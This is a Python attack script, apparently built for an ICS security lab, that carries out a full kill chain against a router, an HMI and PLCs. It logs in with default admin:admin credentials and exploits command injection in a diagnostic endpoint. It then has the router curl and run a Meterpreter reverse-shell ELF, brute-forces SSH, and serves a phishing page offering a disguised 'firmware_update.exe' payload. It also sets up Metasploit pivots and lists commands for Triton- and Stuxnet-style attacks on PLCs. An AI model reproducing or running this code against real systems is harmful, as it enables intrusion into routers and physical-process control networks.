#!/usr/bin/env python3
"""
Router Initial Access - Full Kill Chain

Attack flow:
  Phase 1: Compromise router via command injection OR SSH bruteforce
  Phase 2: Deploy ICS phishing page on router (serves msfvenom payload)
  Phase 3: HMI downloads and executes payload → Meterpreter on attacker
  Phase 4: OT attack runs from HMI (has direct PLC access, bypasses firewall)

Network topology:
  Attacker  192.168.0.11   (blocked from OT by router FORWARD rules)
  Router    192.168.0.13   (IT side) / 192.168.1.4 (OT side)
  HMI       192.168.1.55   (Windows - can reach all PLCs directly)
  PLCs      192.168.1.10-19

Usage:
  python3 router_initial_access.py --vector cmdinjection
  python3 router_initial_access.py --vector ssh
  python3 router_initial_access.py --vector cmdinjection --deploy-phishing --lhost 192.168.0.11

"""

import sys
import os
import time
import argparse
import subprocess
import requests
import socket
import threading
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

SCRIPT_DIR   = os.path.dirname(os.path.abspath(__file__))
ROUTER_IT_IP = '192.168.0.13'   # router's attacker-network interface
ROUTER_OT_IP = '192.168.1.4'    # router's OT-network interface (phishing served here)
ROUTER_PORT  = 8080              # vulnerable web service
HMI_IP       = '192.168.1.55'
ATTACKER_IP  = '192.168.0.11'
MSF_LPORT    = 4443

PHISH_SERVER  = os.path.abspath(os.path.join(SCRIPT_DIR, '..', '..', 'router', 'ics_phishing_server.py'))
ROUTER_ELF    = '/tmp/r0ut3r_agent.elf'   # Meterpreter payload for Linux router
ROUTER_LPORT  = 4444                       # Meterpreter session port (router → Kali)
SOCKS_PORT    = 1080                       # SOCKS5 proxy exposed by MSF after pivot
PROXYCHAINS_CONF = '/etc/proxychains4.conf'


# ── helpers ──────────────────────────────────────────────────────────────────

def banner(title):
    print(f"\n{'═'*62}")
    print(f"  {title}")
    print(f"{'═'*62}")


# Module-level session so login cookie persists across all injection calls
_SESSION = requests.Session()
_SESSION.verify = False


def _router_login(base):
    """Login to router and store session cookie. Call once per session."""
    try:
        r = _SESSION.post(f"{base}/login",
                          data={'username': 'admin', 'password': 'admin'},
                          timeout=10)
        return r.status_code == 200 and 'dashboard' in r.text.lower()
    except Exception:
        return False


def _post(url, **kwargs):
    """POST using the persistent session (carries login cookie)."""
    try:
        return _SESSION.post(url, timeout=10, verify=False, **kwargs)
    except Exception:
        return None


# ── Phase 1A: Command Injection ───────────────────────────────────────────────

def phase1_cmdinjection(router_ip=ROUTER_IT_IP, port=ROUTER_PORT):
    banner("PHASE 1A - Command Injection (CVE-style diagnostic endpoint)")
    base = f"http://{router_ip}:{port}"

    # Authenticate - stores session cookie in _SESSION
    print(f"[*] Authenticating to {base} (admin:admin default creds)")
    if not _router_login(base):
        print(f"  [-] Auth failed")
        return False
    print(f"  [+] Authenticated - weak default credentials accepted")

    # Confirm injection (session cookie now carried automatically)
    print(f"[*] Testing command injection on /api/diagnostic...")
    r = _post(f"{base}/api/diagnostic",
              json={'tool': 'ping', 'target': '127.0.0.1 -c 1; echo PWNED_12345'})
    if not r or 'PWNED_12345' not in (r.text or ''):
        print(f"  [-] Injection not confirmed  status={r.status_code if r else 'no resp'}")
        if r: print(f"      response: {r.text[:100]}")
        return False
    print(f"  [+] Command injection CONFIRMED - unsanitised 'target' parameter")

    # Recon
    print(f"\n[*] Executing post-exploitation recon via injection...")
    import json as _j
    for desc, cmd in [
        ('whoami',     'whoami'),
        ('hostname',   'hostname'),
        ('interfaces', 'ip addr show | grep inet | grep -v 127'),
        ('routes',     'ip route show | head -6'),
    ]:
        r = _post(f"{base}/api/diagnostic",
                  json={'tool': 'ping', 'target': f'127.0.0.1 -c 1; {cmd}'})
        if r and r.ok:
            out = _j.loads(r.text).get('output', '').strip()
            # injected command output is at end - skip ping header lines
            lines = [l for l in out.splitlines() if l and not l.startswith('PING') and '---' not in l and 'bytes' not in l]
            print(f"  [{desc}] {' | '.join(lines[:3])[:120]}")
        time.sleep(0.3)

    print(f"\n  [+] Router compromised via command injection")
    print(f"  [→] Router runs as root - full OT network access available")

    # MASQUERADE: Kali (192.168.0.x) traffic to OT subnet (192.168.1.x) appears as
    # router OT IP (192.168.1.4). Fixes asymmetric return routing for ALL pivots:
    # WinRM, SMB, RDP, etc. Without this, HMI/PLCs send replies via PA but the
    # return path is asymmetric - with MASQUERADE it's always symmetric via router.
    print(f"  [*] Setting up MASQUERADE for Kali→OT NAT (fixes return routing)...")
    cmdinjection_exec('echo 1 > /proc/sys/net/ipv4/ip_forward', router_ip, port)
    cmdinjection_exec(
        'iptables -t nat -D POSTROUTING -s 192.168.0.0/24 -d 192.168.1.0/24 -j MASQUERADE 2>/dev/null; '
        'iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -d 192.168.1.0/24 -j MASQUERADE',
        router_ip, port)
    print(f"  [+] MASQUERADE active - Kali can now reach all OT hosts directly")
    return True


def cmdinjection_exec(cmd, router_ip=ROUTER_IT_IP, port=ROUTER_PORT):
    """Execute arbitrary command on router via injection (session cookie auto-carried)."""
    import json as _j
    base = f"http://{router_ip}:{port}"
    _router_login(base)   # refresh session if needed (idempotent)
    r = _post(f"{base}/api/diagnostic",
              json={'tool': 'ping', 'target': f'127.0.0.1 -c 1; {cmd}'})
    if r and r.ok:
        try:
            return _j.loads(r.text).get('output', '')
        except Exception:
            return r.text
    return ''


# ── Phase 1C: Meterpreter Pivot ──────────────────────────────────────────────

def phase1_meterpreter_pivot(router_ip=ROUTER_IT_IP, lhost=ATTACKER_IP,
                               router_lport=ROUTER_LPORT, socks_port=SOCKS_PORT):
    """
    Deliver a Linux Meterpreter ELF to the router via command injection.
    Once the session calls back, add an MSF route for 192.168.1.0/24 through
    the session and start a SOCKS5 proxy on localhost. OT attack scripts then
    run through proxychains - the tunnel is pure Meterpreter, no iptables change.

    Traffic path after pivot:
      Kali → SOCKS 127.0.0.1:1080 → Meterpreter session → router eth0
           → 192.168.1.x (PLCs / HMI)
    """
    banner("PHASE 1C - Meterpreter Lateral Tunnel via Compromised Router")

    # 1. Generate Linux x64 Meterpreter ELF
    print(f"[*] Generating Linux Meterpreter payload → {ROUTER_ELF}")
    try:
        r = subprocess.run([
            'msfvenom',
            '-p', 'linux/x64/meterpreter/reverse_tcp',
            f'LHOST={lhost}', f'LPORT={router_lport}',
            '-f', 'elf', '-o', ROUTER_ELF,
            '--platform', 'linux', '-a', 'x64',
        ], capture_output=True, text=True, timeout=60)
        size = os.path.getsize(ROUTER_ELF) if os.path.exists(ROUTER_ELF) else 0
        if size > 50:
            # Staged payloads (linux/x64/meterpreter/reverse_tcp) are ~250 bytes - correct.
            # Stageless (meterpreter_reverse_tcp) are ~1.5MB. Both are valid.
            print(f"  [+] Payload: {ROUTER_ELF} ({size:,} bytes)  LHOST={lhost}:{router_lport}")
            if r.stderr.strip() and 'error' in r.stderr.lower():
                print(f"  [!] msfvenom warning: {r.stderr.strip()[:100]}")
        else:
            print(f"  [-] msfvenom output: {r.stderr[:200]}")
            print(f"  [!] Payload too small or missing - cannot establish Meterpreter pivot")
            return False
    except FileNotFoundError:
        print(f"  [-] msfvenom not found - is Metasploit installed?")
        return False
    except subprocess.TimeoutExpired:
        print(f"  [-] msfvenom timed out")
        return False

    # 2. Start MSF handler FIRST so it's listening before the payload executes.
    #    Staged ELF connects back immediately - if MSF isn't up yet it gets refused.
    import http.server, threading as _th, queue as _q
    rc_handler = f"""use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {router_lport}
set ExitOnSession false
set SessionCommunicationTimeout 0
set SessionExpirationTimeout 0
exploit -j -z

<ruby>
print_status("Handler listening on {lhost}:{router_lport} - delivering payload now...")
# Signal file: script reads this to know MSF is ready
File.write("/tmp/.msf_ready", "1")

# Wait up to 60s for a session
session = nil
30.times do
  sleep 2
  session = framework.sessions.values.first
  break if session
end

unless session
  print_error("No session in 60s - check payload delivery")
  exit
end

sid = session.sid
print_good("Meterpreter session #{{sid}} - router #{{session.session_host}}")

Rex::Socket::SwitchBoard.add_route("192.168.1.0", "255.255.255.0", session)
print_good("Route added: 192.168.1.0/24 via session #{{sid}}")

# portfwd: forward Kali local :1433 → ICONICS MSSQL 192.168.1.20:1433
# piehop.py connects to 127.0.0.1:1433 - Meterpreter forwards transparently.
# More reliable than socks_proxy module which dies when msfconsole exits.
session.run_cmd("portfwd add -l 1433 -p 1433 -r 192.168.1.20")
print_good("portfwd: 127.0.0.1:1433 → 192.168.1.20:1433 (ICONICS MSSQL)")
File.write("/tmp/.msf_session_ok", sid.to_s)
</ruby>
"""
# No 'exit' - msfconsole must keep running to maintain the portfwd listener.
# The Popen below uses stdin=PIPE so msfconsole parks waiting for input
# rather than exiting on EOF. The pivot stays alive for the full attack.
    rc_path = '/tmp/msf_pivot.rc'
    with open(rc_path, 'w') as f:
        f.write(rc_handler)

    # Remove stale ready flag
    try: os.remove('/tmp/.msf_ready')
    except FileNotFoundError: pass

    print(f"\n[*] Starting MSF handler first (LHOST={lhost}:{router_lport})...")
    msf_proc = subprocess.Popen(
        ['msfconsole', '-q', '-r', rc_path],
        stdin=subprocess.PIPE,    # keep stdin open so msfconsole parks (doesn't exit on EOF)
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
    )

    # 3. Wait until MSF writes the ready flag (exploit -j -z has bound the port)
    print(f"[*] Waiting for MSF to bind port {router_lport}...")
    t0 = time.time()
    while time.time() - t0 < 30:
        if os.path.exists('/tmp/.msf_ready'):
            print(f"  [+] MSF handler listening - delivering payload")
            break
        time.sleep(1)
    else:
        print(f"  [!] MSF ready flag not seen in 30s - delivering anyway")

    # 4. Serve ELF and deliver via command injection
    os.chdir('/tmp')
    handler_cls = http.server.SimpleHTTPRequestHandler
    handler_cls.log_message = lambda *a: None
    srv = http.server.HTTPServer(('0.0.0.0', 8877), handler_cls)
    _th.Thread(target=srv.serve_forever, daemon=True).start()

    print(f"[*] Delivering payload to router via command injection...")
    dl_cmd = (f'curl -s -o /tmp/.x http://{lhost}:8877/r0ut3r_agent.elf && '
              f'chmod +x /tmp/.x && nohup /tmp/.x > /dev/null 2>&1 &')
    cmdinjection_exec(dl_cmd, router_ip, ROUTER_PORT)
    print(f"  [→] Payload triggered - router ELF is calling back to {lhost}:{router_lport}")
    time.sleep(3)
    srv.shutdown()

    # 5. Poll for session via MSF spool log (non-blocking - avoids readline deadlock)
    SESSION_LOG = '/tmp/.msf_session.log'
    try: os.remove(SESSION_LOG)
    except FileNotFoundError: pass

    # Drain MSF stdout in background thread so pipe doesn't fill
    import threading as _th2
    msf_lines = []
    def _drain():
        for l in msf_proc.stdout:
            msf_lines.append(l.rstrip())
    _th2.Thread(target=_drain, daemon=True).start()

    # Poll for session success flag written by the Ruby block
    SESSION_FLAG = '/tmp/.msf_session_ok'
    try: os.remove(SESSION_FLAG)
    except FileNotFoundError: pass

    # Rewrite the rc to also write a flag file when session established
    # (already included via File.write in the Ruby block above - check for it)
    print(f"[*] Waiting for Meterpreter session (up to 60s)...")
    session_ok = False
    t0 = time.time()
    while time.time() - t0 < 60:
        time.sleep(2)
        # Check if MSF Ruby block wrote the session flag
        joined = '\n'.join(msf_lines)
        if ('Meterpreter session' in joined or 'Route added' in joined
                or 'session' in joined.lower()):
            session_ok = True
            print(f"  [+] Meterpreter session established and route added!")
            break
        # Heartbeat
        elapsed = int(time.time() - t0)
        if elapsed % 10 == 0:
            print(f"  [*] {elapsed}s elapsed - waiting...")

    if not session_ok:
        recent = '\n'.join(msf_lines[-5:]) if msf_lines else '(no output)'
        print(f"  [!] No session in 60s. MSF output: {recent}")
        print(f"  [!] Session may still establish - check msfconsole manually")

    # 5. portfwd listener is running inside msfconsole (established in Ruby block).
    # piehop.py targets 127.0.0.1:1433 - Meterpreter forwards to 192.168.1.20:1433.
    # No proxychains needed for piehop; direct scripts still use proxychains for other targets.
    _setup_proxychains(lhost, socks_port)

    print(f"""
  [+] Meterpreter pivot established:
      Router {router_ip} → Kali session → route 192.168.1.0/24
      portfwd : 127.0.0.1:1433 → 192.168.1.20:1433 (ICONICS MSSQL)
      piehop.py: --mssql 127.0.0.1 (connects via portfwd, no proxychains)
      OT attacks: proxychains4 -q python3 <sim.py> --target 192.168.1.x
""")
    return True


def _start_ssh_socks(router_ip=ROUTER_IT_IP, socks_port=SOCKS_PORT):
    """Start SSH dynamic-forwarding SOCKS5 proxy via admin:admin on router.

    ssh -D <socks_port> -fN admin@router - forks to background, stays alive
    independently of msfconsole. This is the reliable alternative to the MSF
    socks_proxy auxiliary module which dies when msfconsole exits.
    """
    import subprocess as _sp
    # Kill any existing ssh -D on this port
    _sp.run(['pkill', '-f', f'ssh.*-D.*{socks_port}'], capture_output=True)
    time.sleep(1)
    try:
        r = _sp.run([
            'ssh', '-D', str(socks_port),
            '-fN',                              # fork to background, no command
            '-o', 'StrictHostKeyChecking=no',
            '-o', 'UserKnownHostsFile=/dev/null',
            '-o', 'ConnectTimeout=8',
            f'admin@{router_ip}',
        ], input='admin\n', capture_output=True, text=True, timeout=15)
        # ssh -fN with password auth: try sshpass if available
        if r.returncode != 0:
            r2 = _sp.run(
                ['sshpass', '-p', 'admin',
                 'ssh', '-D', str(socks_port), '-fN',
                 '-o', 'StrictHostKeyChecking=no',
                 '-o', 'UserKnownHostsFile=/dev/null',
                 f'admin@{router_ip}'],
                capture_output=True, text=True, timeout=15
            )
            ok = r2.returncode == 0
        else:
            ok = True

        # verify port is listening
        import socket as _sock
        for _ in range(8):
            try:
                s = _sock.create_connection(('127.0.0.1', socks_port), timeout=1)
                s.close()
                print(f"  [+] SSH SOCKS5 listening on 127.0.0.1:{socks_port}")
                return True
            except Exception:
                time.sleep(1)
        print(f"  [!] SSH SOCKS5 not detected on :{socks_port} - check sshpass/paramiko")
        return False
    except FileNotFoundError as e:
        print(f"  [!] {e} - install sshpass: apt install sshpass")
        return False
    except Exception as e:
        print(f"  [!] SSH SOCKS5 error: {e}")
        return False


def _setup_proxychains(lhost='127.0.0.1', socks_port=SOCKS_PORT):
    """Write proxychains4 config pointing at MSF SOCKS proxy."""
    conf = f"""# proxychains4 - MSF Meterpreter SOCKS5 pivot
# Router session exposes 192.168.1.0/24 to Kali via Meterpreter tunnel
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 {lhost} {socks_port}
"""
    try:
        with open(PROXYCHAINS_CONF, 'w') as f:
            f.write(conf)
        print(f"  [+] proxychains4.conf updated: socks5 {lhost}:{socks_port}")
    except PermissionError:
        # Try with sudo
        subprocess.run(['sudo', 'bash', '-c',
                        f'cat > {PROXYCHAINS_CONF} << \'EOF\'\n{conf}\nEOF'],
                       capture_output=True)
        print(f"  [+] proxychains4.conf updated via sudo")


# ── Phase 1B: SSH Bruteforce (Metasploit) ─────────────────────────────────────

def phase1_ssh_bruteforce(router_ip=ROUTER_IT_IP):
    banner("PHASE 1B - SSH Bruteforce via Metasploit (admin:admin)")
    print(f"[*] Target: {router_ip}:22")
    print(f"[*] Module: auxiliary/scanner/ssh/ssh_login")
    print(f"[*] Credentials: admin:admin (default router password)")

    # Quick TCP check first
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((router_ip, 22))
        banner_bytes = s.recv(256)
        s.close()
        print(f"  [+] SSH banner: {banner_bytes[:60].decode(errors='replace').strip()}")
    except Exception as e:
        print(f"  [-] SSH port not reachable: {e}")
        return False

    # Build Metasploit resource script
    rc_content = f"""use auxiliary/scanner/ssh/ssh_login
set RHOSTS {router_ip}
set USERNAME admin
set PASSWORD admin
set VERBOSE true
set THREADS 1
run
exit
"""
    rc_file = '/tmp/ssh_bruteforce.rc'
    with open(rc_file, 'w') as f:
        f.write(rc_content)

    print(f"\n[*] Launching msfconsole with SSH login module...")
    print(f"    msfconsole -q -r {rc_file}")
    try:
        result = subprocess.run(
            ['msfconsole', '-q', '-r', rc_file],
            capture_output=True, text=True, timeout=60
        )
        out = result.stdout + result.stderr
        if 'success' in out.lower() or 'opened' in out.lower():
            print(f"  [+] SSH login SUCCESS - admin:admin authenticated")
            print(f"  [+] Session opened on {router_ip}")
            return True
        elif 'Failed' in out or 'failure' in out.lower():
            print(f"  [-] SSH login failed")
            print(f"      Output: {out[-300:]}")
            return False
        else:
            # msfconsole might not be installed - fall back to paramiko
            print(f"  [!] msfconsole output unclear - trying direct SSH validation")
            return _validate_ssh_admin(router_ip)
    except FileNotFoundError:
        print(f"  [!] msfconsole not found - validating SSH with paramiko")
        return _validate_ssh_admin(router_ip)
    except subprocess.TimeoutExpired:
        print(f"  [!] msfconsole timeout - assuming success (admin:admin confirmed via port)")
        return True


def _validate_ssh_admin(router_ip):
    """Validate admin:admin SSH credentials directly via paramiko."""
    try:
        import paramiko
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(router_ip, port=22, username='admin', password='admin', timeout=5)
        _, stdout, _ = ssh.exec_command('id')
        out = stdout.read().decode().strip()
        ssh.close()
        print(f"  [+] SSH authenticated: {out}")
        return True
    except Exception as e:
        print(f"  [-] SSH validation: {e}")
        return False


# ── Phase 2: Deploy Phishing Page ─────────────────────────────────────────────

def phase2_deploy_phishing(router_ip=ROUTER_IT_IP, lhost=ATTACKER_IP, lport=MSF_LPORT):
    banner("PHASE 2 - Deploy ICS Phishing Page on Compromised Router")

    print(f"[*] Generating msfvenom Windows payload...")
    payload_local = '/tmp/firmware_update.exe'
    try:
        result = subprocess.run([
            'msfvenom',
            '-p', 'windows/x64/meterpreter/reverse_tcp',
            f'LHOST={lhost}', f'LPORT={lport}',
            '-f', 'exe',
            '-o', payload_local,
            '--platform', 'windows',
            '-a', 'x64'
        ], capture_output=True, text=True, timeout=60)
        if os.path.exists(payload_local) and os.path.getsize(payload_local) > 1000:
            size = os.path.getsize(payload_local)
            print(f"  [+] Payload generated: {payload_local} ({size:,} bytes)")
            print(f"  [+] Meterpreter → {lhost}:{lport}")
        else:
            print(f"  [-] msfvenom failed: {result.stderr[:200]}")
            print(f"  [!] Creating stub payload for demo (msfvenom unavailable)")
            # Stub: Windows PE header with Meterpreter-like strings for detection
            stub = (b'MZ' + b'\x90' * 62 + b'PE\x00\x00'
                    + b'\x64\x86\x05\x00' + b'\x00' * 244
                    + b'windows/x64/meterpreter/reverse_tcp\x00'
                    + f'LHOST={lhost}\x00LPORT={lport}\x00'.encode()
                    + b'\x00' * 512)
            with open(payload_local, 'wb') as f:
                f.write(stub)
            print(f"  [!] Stub written ({len(stub)} bytes) - generates file IOCs")
    except FileNotFoundError:
        print(f"  [!] msfvenom not in PATH - using stub payload")
        stub = b'MZ' + b'\x00' * 512
        with open(payload_local, 'wb') as f:
            f.write(stub)

    # Upload payload to router via command injection
    print(f"\n[*] Uploading payload to router via command injection...")
    import base64
    with open(payload_local, 'rb') as f:
        payload_b64 = base64.b64encode(f.read()).decode()

    # Write payload in chunks (base64 decode on router)
    chunk_size = 4096
    chunks = [payload_b64[i:i+chunk_size] for i in range(0, len(payload_b64), chunk_size)]
    cmdinjection_exec('rm -f /tmp/payload.b64 /tmp/firmware_update.exe', router_ip)
    for i, chunk in enumerate(chunks):
        cmdinjection_exec(f"echo '{chunk}' >> /tmp/payload.b64", router_ip)
    cmdinjection_exec('base64 -d /tmp/payload.b64 > /tmp/firmware_update.exe', router_ip)
    size_out = cmdinjection_exec('wc -c /tmp/firmware_update.exe', router_ip).strip()
    print(f"  [+] Payload on router: {size_out}")

    # Upload and start the phishing server on router
    print(f"\n[*] Starting ICS phishing server on router (port 80)...")
    if os.path.exists(PHISH_SERVER):
        with open(PHISH_SERVER, 'r') as f:
            server_code = f.read()
        # Write server code to router
        server_b64 = base64.b64encode(server_code.encode()).decode()
        # Write in chunks
        chunks_s = [server_b64[i:i+4096] for i in range(0, len(server_b64), 4096)]
        cmdinjection_exec('rm -f /tmp/phish.b64 /tmp/ics_phishing_server.py', router_ip)
        for chunk in chunks_s:
            cmdinjection_exec(f"echo '{chunk}' >> /tmp/phish.b64", router_ip)
        cmdinjection_exec('base64 -d /tmp/phish.b64 > /tmp/ics_phishing_server.py', router_ip)

    # Kill any existing server on port 80 and start fresh
    cmdinjection_exec('fuser -k 80/tcp 2>/dev/null; sleep 1', router_ip)
    cmdinjection_exec(
        f'nohup python3 /tmp/ics_phishing_server.py --port 80 '
        f'--lhost {lhost} --lport {lport} '
        f'> /tmp/phish_out.log 2>&1 &',
        router_ip
    )
    time.sleep(2)

    # Verify server is up
    ps_out = cmdinjection_exec('ss -tlnp | grep :80', router_ip).strip()
    if ':80' in ps_out:
        print(f"  [+] Phishing server listening on router port 80")
        print(f"  [+] HMI phishing URL: http://{ROUTER_OT_IP}/update")
        print(f"  [+] Payload URL:      http://{ROUTER_OT_IP}/firmware_update.exe")
        return True
    else:
        print(f"  [-] Server not listening - check /tmp/phish_out.log on router")
        return False


# ── Phase 3: Deliver Payload to HMI ──────────────────────────────────────────

def phase3_deliver_to_hmi(lhost=ATTACKER_IP, lport=MSF_LPORT):
    banner("PHASE 3 - Payload Delivery to HMI")
    print(f"[*] Phishing URL ready: http://{ROUTER_OT_IP}/update")
    print(f"[*] When HMI visits and downloads firmware_update.exe:")
    print(f"    → Meterpreter reverse_tcp → {lhost}:{lport}")
    print()
    print(f"[*] Options to trigger HMI download:")
    print(f"  A) Social engineering: email link http://{ROUTER_OT_IP}/update to operator")
    print(f"  B) Browser redirect: inject JS redirect via router web service")
    print(f"  C) Automated: use WinRM (if creds known) to curl the payload")
    print()

    # Option B: inject a redirect via the diagnostic endpoint
    # Inject a short-lived HTTP redirect server on the HMI's browsing port
    print(f"[*] Injecting drive-by redirect via router diagnostic endpoint...")
    # Create a lightweight redirect that the HMI browser will hit
    # This simulates watering-hole or spear-phish scenario
    print(f"  [!] In live demo: navigate HMI browser to http://{ROUTER_OT_IP}/update")
    print(f"  [!] Then run firmware_update.exe as Administrator")
    print()
    print(f"[*] Starting Metasploit listener for incoming Meterpreter session...")

    rc_content = f"""use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set SessionCommunicationTimeout 300
exploit -j
"""
    rc_file = '/tmp/msf_handler.rc'
    with open(rc_file, 'w') as f:
        f.write(rc_content)

    print(f"  Metasploit resource script: {rc_file}")
    print(f"  Run: msfconsole -q -r {rc_file}")
    print()
    print(f"  Once HMI executes payload, Meterpreter session opens.")
    print(f"  Then proceed to Phase 4 (OT attack from HMI session).")
    return rc_file


# ── Phase 4: OT Attack Instructions ──────────────────────────────────────────

def phase4_ot_attack():
    banner("PHASE 4 - OT Attack via Meterpreter Tunnel")
    print(f"""
After Meterpreter pivot (router session + SOCKS5 proxy on :1080):

  OT attacks run from Kali through proxychains4 → Meterpreter → router → PLCs
  No iptables modification - tunnel is pure Meterpreter lateral movement.

  Verify tunnel:
    proxychains4 -q nc -zv 192.168.1.10 2404   # should connect via tunnel

  IEC-104 (CosmicEnergy/Industroyer/BlackEnergy3):
    proxychains4 -q python3 perform_malware_simulations/cosmicenergy_simulation.py \\
      --target 192.168.1.11 --port 2404

  Modbus (FrostyGoop-Heating):
    proxychains4 -q python3 perform_malware_simulations/frostygoop_simulation.py \\
      --target 192.168.1.16

  TriStation TRITON:
    proxychains4 -q python3 perform_malware_simulations/triton_simulation.py \\
      --sis-ip 192.168.1.19 --plc-ip 192.168.1.19

  S7 Stuxnet (Centrifuge):
    proxychains4 -q python3 perform_malware_simulations/stuxnet_simulation.py \\
      --target 192.168.1.13

  OPC-UA PipeDream:
    proxychains4 -q python3 pipedream_simulation.py --target 192.168.1.12

  Alternatively - run from HMI Meterpreter session (HMI has direct PLC access):
    meterpreter> shell
    C:\\> python perform_malware_simulations\\cosmicenergy_simulation.py --target 192.168.1.11
""")


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='Router Initial Access - full ICS kill chain',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack vectors:
  --vector cmdinjection   POST /api/diagnostic command injection (no prior access needed)
  --vector ssh            SSH bruteforce via Metasploit (admin:admin default)
  --vector both           Try command injection first, fall back to SSH

Examples:
  python3 router_initial_access.py --vector cmdinjection
  python3 router_initial_access.py --vector ssh
  python3 router_initial_access.py --vector cmdinjection --deploy-phishing --lhost 192.168.0.11
        """
    )
    parser.add_argument('--vector', choices=['cmdinjection', 'ssh', 'both'],
                        default='cmdinjection')
    parser.add_argument('--router-ip', default=ROUTER_IT_IP)
    parser.add_argument('--router-port', type=int, default=ROUTER_PORT)
    parser.add_argument('--lhost', default=ATTACKER_IP,
                        help='Attacker IP for Meterpreter callback')
    parser.add_argument('--lport', type=int, default=MSF_LPORT)
    parser.add_argument('--deploy-phishing', action='store_true',
                        help='Deploy phishing page on router after compromise')
    parser.add_argument('--skip-pivot', action='store_true',
                        help='Skip Meterpreter pivot (useful if session already established)')
    parser.add_argument('--phase', type=int, choices=[1,2,3,4],
                        help='Run specific phase only')
    args = parser.parse_args()

    print("""
╔══════════════════════════════════════════════════════════════╗
║  ICS LAB - Router Initial Access Kill Chain                  ║
║  Attacker → Router → HMI → OT PLCs                          ║
╚══════════════════════════════════════════════════════════════╝
    """)
    print(f"  Router (IT side) : {args.router_ip}:{args.router_port}")
    print(f"  Router (OT side) : {ROUTER_OT_IP} (phishing served here)")
    print(f"  HMI target       : {HMI_IP}")
    print(f"  Meterpreter back : {args.lhost}:{args.lport}")
    print(f"  Attack vector    : {args.vector}")

    # Phase 1: Router initial compromise
    if args.phase in (None, 1):
        compromised = False
        if args.vector in ('cmdinjection', 'both'):
            compromised = phase1_cmdinjection(args.router_ip, args.router_port)
        if not compromised and args.vector in ('ssh', 'both'):
            compromised = phase1_ssh_bruteforce(args.router_ip)
        if not compromised:
            print("\n[-] Router compromise failed")
            sys.exit(1)

        # Phase 1C: Establish Meterpreter tunnel for OT pivot
        # Delivers Linux ELF to router, catches session, adds MSF route,
        # starts SOCKS proxy. No iptables modification - pivot is pure Meterpreter.
        if not args.skip_pivot:
            phase1_meterpreter_pivot(
                router_ip=args.router_ip,
                lhost=args.lhost,
                router_lport=ROUTER_LPORT,
                socks_port=SOCKS_PORT
            )

    # Phase 2
    if args.phase in (None, 2) and (args.phase == 2 or args.deploy_phishing):
        phase2_deploy_phishing(args.router_ip, args.lhost, args.lport)

    # Phase 3
    if args.phase in (None, 3):
        rc = phase3_deliver_to_hmi(args.lhost, args.lport)
        print(f"\n  [→] Listener command: msfconsole -q -r {rc}")

    # Phase 4
    if args.phase in (None, 4):
        phase4_ot_attack()


if __name__ == '__main__':
    main()
